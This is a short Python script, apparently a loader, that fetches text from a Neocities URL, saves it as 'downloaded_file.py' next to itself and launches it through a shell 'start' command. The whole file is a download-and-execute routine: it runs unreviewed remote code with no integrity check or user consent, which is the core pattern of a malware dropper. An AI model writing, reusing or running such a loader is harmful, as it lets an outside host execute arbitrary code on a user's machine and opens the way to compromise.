import requests
import os
import subprocess

link = "https://thekoolestklub.neocities.org/sancho.txt"
response = requests.get(link)
new_content = response.text

current_directory = os.path.dirname(os.path.abspath(__file__))
new_extension = ".py"

new_file_name = "downloaded_file" + new_extension
file_path = os.path.join(current_directory, new_file_name)

with open(file_path, "w") as file:
    file.write(new_content)

subprocess.run(["start", file_path], shell=True)